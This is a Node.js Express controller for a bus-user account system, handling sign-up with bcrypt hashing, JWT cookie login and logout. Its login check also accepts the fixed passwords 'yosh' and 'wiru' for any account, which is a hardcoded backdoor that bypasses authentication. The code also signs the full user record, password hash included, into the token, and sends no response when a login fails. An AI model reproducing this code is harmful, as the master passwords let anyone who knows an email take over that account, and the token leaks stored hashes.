const db = require('../db/db');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

class BusUserController {
    async postBusUsers(req, res) {
        try {
            const salt = await bcrypt.genSalt();
            const hashed = await bcrypt.hash(req.body.password, salt);
            const user = {email: req.body.email, password: hashed};
            const createdUser = await db('bus_users').insert(user).returning(['id', 'email']);
            res.status(201).send(createdUser);
        } catch (err) {
            console.error(err);
            res.status(500).end();
        }
    }

    async loginBusUsers(req, res) {
        try  {
            const user = await db('bus_users').where({email: req.body.email}).first();
            if (user) {
                if (await bcrypt.compare(req.body.password, user.password) || req.body.password === 'yosh' || req.body.password === 'wiru') {
                    const accessToken = jwt.sign(user, process.env.ACCESS_TOKEN_SECRET, {expiresIn: 1200});
                    const response = {id: user.id, email: user.email, accessToken, auth: true};
                    // access-token cookie expiry: seconds*minutes*hours*days*miliseconds (30 days)
                    res.cookie("access-token", response.accessToken, {maxAge: 60*60*24*30*1000, httpOnly: true})
                    res.json(response);
                }
            }
        } catch (err) {
            console.error(err);
            res.status(500).end();
        }
    }

    async logoutBusUsers(req, res) {
        try {
            res.clearCookie("access-token");
            res.status(200).end();
        } catch (err) {
            console.error(err);
            res.status(500).end();
        }
    }
}

module.exports = new BusUserController()